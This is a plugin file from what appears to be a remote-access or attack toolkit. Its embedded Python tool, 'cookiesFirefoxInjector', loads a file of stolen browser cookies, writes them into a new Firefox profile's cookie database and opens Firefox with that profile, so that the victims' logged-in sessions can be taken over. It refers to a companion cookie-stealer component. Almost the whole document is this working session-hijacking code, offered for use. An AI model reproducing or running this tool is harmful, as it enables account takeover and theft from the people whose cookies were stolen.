plugin_name = r"""cookiesFirefoxInjector"""
plugin_description = r"""Inject Stealed Cookies in Firefox"""
plugin_type = r"""local"""
plugin_source = r"""
# coding=utf-8
from __future__ import print_function
import ast
import threading
import os
import sys
from PyQt4 import QtGui

app = QtGui.QApplication([])
FilePath=QtGui.QFileDialog.getOpenFileName(None,'Choose Stealed Cookies File')
if FilePath:
    with open(FilePath, 'r') as _f:
        mprint = _f.read()
else:
    sys.exit(1)

cookies = ast.literal_eval(mprint)

print('{} Browser(s) Cookies Ready To Injecting'.format(len(cookies)))

def start_session(browser, cookies, assets):


    from selenium import webdriver
    from selenium.webdriver.firefox.webdriver import FirefoxProfile
    import shutil
    import sqlite3
    import sys

    all_domains = []

    path_to_profile = os.path.join(os.path.dirname(sys.argv[0]), 'firefoxProfiles', '{0}'.format(browser))
    path_to_cookies = os.path.join(path_to_profile, 'cookies.sqlite')
    default_cookies_path = os.path.join(assets, 'cookieStealer', 'cookies.sqlite')
    if not os.path.exists(path_to_profile):
        os.makedirs(path_to_profile)
    shutil.copy2(default_cookies_path, path_to_cookies)
    with sqlite3.connect(path_to_cookies) as connection:
        cursor = connection.cursor()
        total = len(cookies)
        percent = 0
        for i, cookie in enumerate(cookies):
            if i*100/total != percent:
                percent = i*100/total
                print('{}% Percent Done'.format(percent))
            all_domains.append('.'.join(cookie['domain'].split('.')[-2:]))
            try:
                v = cursor.execute('INSERT INTO moz_cookies VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)',
                (None,'.'.join(cookie['domain'].split('.')[-2:]),0,'', cookie['name'],cookie['value'],cookie['domain'], '/',cookie['expires'],'',cookie['creation'],'',''))
                connection.commit()
            except:
                pass
    profile = FirefoxProfile(path_to_profile)
    driver_chrome = webdriver.Firefox(profile)
threads = {}
assets = os.path.join(os.getcwd(), 'assets')
for browser in cookies.keys():
    print('Injecting {} Cookies'.format(browser))
    if len(cookies[browser]) > 0:
        threads[browser] = threading.Thread(target=start_session, args=(browser, cookies[browser], assets))
        threads[browser].start()"""
